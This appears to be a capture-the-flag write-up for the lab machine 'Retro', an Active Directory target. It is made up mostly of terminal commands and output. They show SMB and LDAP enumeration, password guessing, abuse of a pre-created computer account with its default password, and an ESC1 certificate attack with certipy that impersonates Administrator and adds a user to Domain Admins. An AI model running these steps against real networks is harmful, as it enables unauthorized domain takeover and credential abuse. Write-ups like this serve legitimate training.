
```
kali@kali 2026-01-01 19:02:32 ~> nmap -sC -sV -Pn 10.129.234.44
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-01 19:02 UTC
NSE: DEPRECATION WARNING: bin.lua is deprecated. Please use Lua 5.3 string.pack
Stats: 0:00:38 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 98.03% done; ETC: 19:03 (0:00:00 remaining)
Nmap scan report for 10.129.234.44
Host is up (0.098s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-01-01 19:02:52Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
|_ssl-date: 2026-01-01T19:05:11+00:00; +2s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: 2026-01-01T19:05:10+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2024-10-02T10:33:09
|_Not valid after:  2025-10-02T10:33:09
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC.retro.vl
| Not valid before: 2025-12-31T18:54:22
|_Not valid after:  2026-07-02T18:54:22
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 1s, deviation: 0s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 153.70 seconds

```







```
kali@kali 2026-01-01 19:32:29 ~> nxc smb retro.vl -u 'a' -p '' --shares
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.44   445    DC               [+] retro.vl\a: (Guest)
SMB         10.129.234.44   445    DC               [*] Enumerated shares
SMB         10.129.234.44   445    DC               Share           Permissions     Remark
SMB         10.129.234.44   445    DC               -----           -----------     ------
SMB         10.129.234.44   445    DC               ADMIN$                          Remote Admin
SMB         10.129.234.44   445    DC               C$                              Default share
SMB         10.129.234.44   445    DC               IPC$            READ            Remote IPC
SMB         10.129.234.44   445    DC               NETLOGON                        Logon server share 
SMB         10.129.234.44   445    DC               Notes                           
SMB         10.129.234.44   445    DC               SYSVOL                          Logon server share 
SMB         10.129.234.44   445    DC               Trainees        READ            

```




```
kali@kali 2026-01-01 19:33:40 ~> smbclient.py retro.vl/'Guest':''@10.129.234.44
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
Notes
SYSVOL
Trainees
# use Trainees
# ls
drw-rw-rw-          0  Sun Jul 23 22:16:11 2023 .
drw-rw-rw-          0  Wed Jun 11 14:17:10 2025 ..
-rw-rw-rw-        288  Sun Jul 23 22:16:11 2023 Important.txt
# get Important.txt

```



```
kali@kali 2026-01-01 19:34:12 ~> cat Important.txt 
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards.
```






```
kali@kali 2026-01-01 19:36:31 ~> nxc smb retro.vl -u 'a' -p '' --rid-brute 10000
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.44   445    DC               [+] retro.vl\a: (Guest)
SMB         10.129.234.44   445    DC               498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               500: RETRO\Administrator (SidTypeUser)
SMB         10.129.234.44   445    DC               501: RETRO\Guest (SidTypeUser)
SMB         10.129.234.44   445    DC               502: RETRO\krbtgt (SidTypeUser)
SMB         10.129.234.44   445    DC               512: RETRO\Domain Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               513: RETRO\Domain Users (SidTypeGroup)
SMB         10.129.234.44   445    DC               514: RETRO\Domain Guests (SidTypeGroup)
SMB         10.129.234.44   445    DC               515: RETRO\Domain Computers (SidTypeGroup)
SMB         10.129.234.44   445    DC               516: RETRO\Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               517: RETRO\Cert Publishers (SidTypeAlias)
SMB         10.129.234.44   445    DC               518: RETRO\Schema Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               519: RETRO\Enterprise Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               520: RETRO\Group Policy Creator Owners (SidTypeGroup)
SMB         10.129.234.44   445    DC               521: RETRO\Read-only Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
SMB         10.129.234.44   445    DC               525: RETRO\Protected Users (SidTypeGroup)
SMB         10.129.234.44   445    DC               526: RETRO\Key Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               527: RETRO\Enterprise Key Admins (SidTypeGroup)
SMB         10.129.234.44   445    DC               553: RETRO\RAS and IAS Servers (SidTypeAlias)
SMB         10.129.234.44   445    DC               571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.44   445    DC               572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
SMB         10.129.234.44   445    DC               1000: RETRO\DC$ (SidTypeUser)
SMB         10.129.234.44   445    DC               1101: RETRO\DnsAdmins (SidTypeAlias)
SMB         10.129.234.44   445    DC               1102: RETRO\DnsUpdateProxy (SidTypeGroup)
SMB         10.129.234.44   445    DC               1104: RETRO\trainee (SidTypeUser)
SMB         10.129.234.44   445    DC               1106: RETRO\BANKING$ (SidTypeUser)
SMB         10.129.234.44   445    DC               1107: RETRO\jburley (SidTypeUser)
SMB         10.129.234.44   445    DC               1108: RETRO\HelpDesk (SidTypeGroup)
SMB         10.129.234.44   445    DC               1109: RETRO\tblack (SidTypeUser)

```


Using my pure unimagineable smart ass hubris I was able to guess the password was the same as the username


```
kali@kali 2026-01-01 19:37:00 ~> nxc smb retro.vl -u 'trainee' -p 'trainee'  -k
SMB         retro.vl        445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         retro.vl        445    DC               [+] retro.vl\trainee:trainee 
```

Lets do a tree to see what the folders contain from what we installed on the smb share

```
kali@kali 2026-01-01 19:40:55 ~/.n/m/n/10.129.234.44> tree                                                                                                                                                                                   
.                                                                                                                     
├── Notes                                                                                                             
│   ├── ToDo.txt                                                                                                                                                                                                                             
│   └── user.txt                                                                                                      
├── SYSVOL                                                                                                            
│   └── retro.vl                                                                                                      
│       └── Policies                                                                                                  
│           ├── {31B2F340-016D-11D2-945F-00C04FB984F9}                                                                
│           │   ├── GPT.INI                                                                                           
│           │   └── MACHINE                                                                                           
│           │       ├── Microsoft                                                                                                                                                                                                            
│           │       │   └── Windows NT                                                                                
│           │       │       └── SecEdit                                                                               
│           │       │           └── GptTmpl.inf                                                                       
│           │       └── Registry.pol                                                                                  
│           └── {6AC1786C-016F-11D2-945F-00C04fB984F9}                                                                
│               ├── GPT.INI                                                                                           
│               └── MACHINE                                                                                                                                                                                                                  
│                   └── Microsoft                                                                                                                                                                                                            
│                       └── Windows NT                                                                                                                                                                                                       
│                           └── SecEdit                                                                                                                                                                                                      
│                               └── GptTmpl.inf                                                                       
└── Trainees                                                                                                                                                                                                                                 
    └── Important.txt                                                                                                 
                                                                                                                      
16 directories, 8 files                                                                                               
kali@kali 2026-01-01 19:40:56 ~/.n/m/n/10.129.234.44> cd Notes                                                        
kali@kali 2026-01-01 19:41:01 ~/.n/m/n/1/Notes> ls                                                                    
ToDo.txt  user.txt                                                                                                                                                                                                                           
kali@kali 2026-01-01 19:41:01 ~/.n/m/n/1/Notes> cat ToDo.txt                                                          
Thomas,                                          
                                                           
after convincing the finance department to get rid of their ancienct banking software                                 
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.                                                                          
                                                           
Best                                                                                                                  
                                                                                                                      
James⏎                                                                                                                                                                                                                                       
```




we see that there is a todo with the pre2000 user account!. lets find it. When looking at the trustedsecs blog we can see the two UAC flags used to recognize Pre-2000 computers!


```
╭─LDAPS─[DC.retro.vl]─[RETRO\trainee]-[NS:10.129.234.44] [WEB]
╰─PV ❯ Get-DomainComputer -LDAPFilter "(&(userAccountControl:1.2.840.113556.1.4.803:=32)(userAccountControl:1.2.840.113556.1.4.803:=4096))"
objectClass                       : top
                                    person
                                    organizationalPerson 
                                    user
                                    computer
cn                                : banking
distinguishedName                 : CN=banking,CN=Computers,DC=retro,DC=vl
instanceType                      : 4
name                              : banking
objectGUID                        : {eef62ef7-140f-4afc-8f6c-4f95bace9613}
userAccountControl                : PASSWD_NOTREQD
                                    WORKSTATION_TRUST_ACCOUNT
badPwdCount                       : 0
badPasswordTime                   : 23/07/2023 22:13:34 (2 years, 5 months ago)
lastLogoff                        : 1601-01-01 00:00:00+00:00
lastLogon                         : 23/07/2023 22:24:09 (2 years, 5 months ago)
pwdLastSet                        : 23/07/2023 21:54:02 (2 years, 5 months ago)
primaryGroupID                    : 515
objectSid                         : S-1-5-21-2983547755-698260136-4283918172-1106
logonCount                        : 3
sAMAccountName                    : BANKING$
sAMAccountType                    : SAM_MACHINE_ACCOUNT
objectCategory                    : CN=Computer,CN=Schema,CN=Configuration,DC=retro,DC=vl
lastLogonTimestamp                : 23/07/2023 21:54:37 (2 years, 5 months ago)
vulnerabilities                   : [VULN-003] User account with password not required (HIGH)
```

So now lets authenticate!

```
kali@kali 2026-01-01 20:00:52 ~> nxc smb retro.vl -u 'banking$' -p 'banking'
SMB         10.129.234.44   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.234.44   445    DC               [-] retro.vl\banking$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT 
kali@kali 2026-01-01 20:04:12 ~> getTGT.py retro.vl/'banking$':'banking'
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in banking$.ccache
kali@kali 2026-01-01 20:04:28 ~> export KRB5CCNAME=banking\$.ccache
kali@kali 2026-01-01 20:04:31 ~> nxc smb retro.vl -k --use-kcache
SMB         retro.vl        445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         retro.vl        445    DC               [+] RETRO.VL\banking$ from ccache 
```


(or an alternative we can change the password using changepasswd.py)

```
kali@kali 2026-01-01 20:19:35 ~> changepasswd.py retro.vl/'banking$':'banking'@DC.retro.vl -altuser trainee -altpass trainee  -dc-ip 10.129.234.44
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

New password: 
Retype new password: 
[!] Attempting to *change* the password of retro.vl/banking$ as retro.vl/trainee. You may want to use '-reset' to *reset* the password of the target.
[*] Changing the password of retro.vl\banking$
[*] Connecting to DCE/RPC as retro.vl\trainee
[*] Password was changed successfully.
```

Now what were going to do is enumerate what this user has!.... thats if they had something but they have really like... nothing LOL. turns out the path is ADCS!

```
kali@kali 2026-01-01 20:35:39 ~> nxc ldap retro.vl -u banking\$ -p password -M adcs
LDAP        10.129.234.44   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:retro.vl) (signing:None) (channel binding:Never) 
LDAP        10.129.234.44   389    DC               [+] retro.vl\banking$:password 
ADCS        10.129.234.44   389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS        10.129.234.44   389    DC               Found PKI Enrollment Server: DC.retro.vl
ADCS        10.129.234.44   389    DC               Found CN: retro-DC-CA
```



```
Certificate Templates                                                                                                                                                                                                                        
  0                                                                                                                                                                                                                                          
    Template Name                       : RetroClients                                                                                                                                                                                       
    Display Name                        : Retro Clients                                                                                                                                                                                      
    Certificate Authorities             : retro-DC-CA                                                                                                                                                                                        
    Enabled                             : True                                                                                                                                                                                               
    Client Authentication               : True                                                                                                                                                                                               
    Enrollment Agent                    : False                                                                                                                                                                                              
    Any Purpose                         : False                                                                                                                                                                                              
    Enrollee Supplies Subject           : True                                                                                                                                                                                               
    Certificate Name Flag               : EnrolleeSuppliesSubject                                                                                                                                                                            
    Extended Key Usage                  : Client Authentication                                                                                                                                                                              
    Requires Manager Approval           : False                                                                                                                                                                                              
    Requires Key Archival               : False                                                                                                                                                                                              
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2023-07-23T21:17:47+00:00
    Template Last Modified              : 2023-07-23T21:18:39+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : RETRO.VL\Administrator
        Full Control Principals         : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Owner Principals          : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Dacl Principals           : RETRO.VL\Domain Admins
                                          RETRO.VL\Enterprise Admins
        Write Property Enroll           : RETRO.VL\Domain Admins
                                          RETRO.VL\Domain Computers
                                          RETRO.VL\Enterprise Admins
    [+] User Enrollable Principals      : RETRO.VL\Domain Computers
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.

```



So now that we know we can exploit ESC1, we can take advantage of that and make use of a user who already has domain admins.

```
╭─LDAPS─[DC.retro.vl]─[RETRO\trainee]-[NS:10.129.234.44] [WEB]
╰─PV ❯ Get-DomainUser -Identity "JBURLEY" -Properties *                                                              
objectClass               : top
                            person
                            organizationalPerson
                            user
cn                        : James Burley
sn                        : Burley
givenName                 : James
distinguishedName         : CN=James Burley,CN=Users,DC=retro,DC=vl
instanceType              : 4
whenCreated               : 23/07/2023 22:06:50 (2 years, 5 months ago)
whenChanged               : 23/07/2023 22:23:56 (2 years, 5 months ago)
displayName               : James Burley
uSNCreated                : 13007
memberOf                  : CN=Domain Admins,CN=Users,DC=retro,DC=vl
uSNChanged                : 13080
name                      : James Burley
objectGUID                : {e435d9d2-f903-456b-8577-60ac9ce3e52a}
userAccountControl        : NORMAL_ACCOUNT
                            DONT_EXPIRE_PASSWORD
badPwdCount               : 0
codePage                  : 0
countryCode               : 0
badPasswordTime           : 01/01/1601 00:00:00 (425 years, 0 month ago)
lastLogoff                : 1601-01-01 00:00:00+00:00
lastLogon                 : 01/01/1601 00:00:00 (425 years, 0 month ago)
pwdLastSet                : 23/07/2023 22:06:50 (2 years, 5 months ago)
primaryGroupID            : 513
objectSid                 : S-1-5-21-2983547755-698260136-4283918172-1107
adminCount                : 1
accountExpires            : 9999-12-31 23:59:59.999999+00:00
logonCount                : 0
sAMAccountName            : jburley
sAMAccountType            : SAM_USER_OBJECT
userPrincipalName         : jburley@retro.vl
objectCategory            : CN=Person,CN=Schema,CN=Configuration,DC=retro,DC=vl
dSCorePropagationData     : 07/23/2023 22:23:56 PM
                            01/01/1601 00:00:00 AM
vulnerabilities           : [VULN-002] User account with password that never expires (LOW)
                            [VULN-020] Admin account with delegation enabled (HIGH)

```

Now lets construct that command

```
kali@kali 2026-01-01 20:55:07 ~> certipy req -u 'BANKING$@retro.vl' -hashes '8846f7eaee8fb117ad06bdd830b7586c' -dc-ip '10.129.234.44' -target 'DC.retro.vl' -ca 'retro-DC-CA' -template 'RetroClients' -upn 'administrator@retro.vl' -sid 'S-
1-5-21-2983547755-698260136-4283918172-500' -key-size 9000                                                                                                                                                                                   
Certipy v5.0.3 - by Oliver Lyak (ly4k)                 
                                                           
[*] Requesting certificate via RPC                         
[*] Request ID is 13                                                                                                                                                                                                                         
[*] Successfully requested certificate                                                                                
[*] Got certificate with UPN 'administrator@retro.vl'                                                                                                                                                                                        
[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'                                                                                                                                                                 
[*] Saving certificate and private key to 'administrator.pfx'                                                                                                                                                                                
[*] Wrote certificate and private key to 'administrator.pfx'                                                          


```


```
kali@kali 2026-01-01 20:55:33 ~> certipy auth -pfx 'administrator.pfx' -dc-ip '10.129.234.44'                                                                                                                                                
Certipy v5.0.3 - by Oliver Lyak (ly4k)                                                                                                                                                                                                       
                                                                                                                      
[*] Certificate identities:                                                                                                                                                                                                                  
[*]     SAN UPN: 'administrator@retro.vl'                                                                             
[*]     SAN URL SID: 'S-1-5-21-2983547755-698260136-4283918172-500'                                                   
[*]     Security Extension SID: 'S-1-5-21-2983547755-698260136-4283918172-500'                                        
[*] Using principal: 'administrator@retro.vl'                                                                         
[*] Trying to get TGT...                                                                                                                                                                                                                     
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)                                                                                                             
[-] Use -debug to print a stacktrace                                                                                                                                                                                                         
[-] See the wiki for more information                      

```

Since I kept getting this error I frankly opted to use ldapshell as mentioned in a random github issue that pops up when looking up the error message

```
kali@kali 2026-01-01 20:59:45 ~> certipy auth -pfx 'administrator.pfx' -dc-ip '10.129.234.44' -ldap-shell                                                                                                                                    
Certipy v5.0.3 - by Oliver Lyak (ly4k)                                                                                                                                                                                                       

[*] Certificate identities:                                                                                                                                                                                                                  
[*]     SAN UPN: 'administrator@retro.vl'                                                                                                                                                                                                    
[*]     SAN URL SID: 'S-1-5-21-2983547755-698260136-4283918172-500'                                                   
[*]     Security Extension SID: 'S-1-5-21-2983547755-698260136-4283918172-500'                                                                                                                                                               
[*] Connecting to 'ldaps://10.129.234.44:636'                                                                         
[*] Authenticated to '10.129.234.44' as: 'u:RETRO\\Administrator'                                                     
Type help for list of commands                                                                                                                                                                                                               

#                                                                                                                     
```


```
# whoami
u:RETRO\Administrator

# add_user_to_group trainee "domain admins"                                                                            
Adding user: trainee trainee to group Domain Admins result: OK

# add_user_to_group trainee "Remote Desktop Users"
Adding user: trainee trainee to group Remote Desktop Users result: OK
```


```
evil-winrm-py PS C:\users\administrator\desktop> cat root.txt
40fce9c3f09024bcab29d377ee1ed071
```


could be this?



https://sensepost.com/blog/2025/diving-into-ad-cs-exploring-some-common-error-messages/

https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts


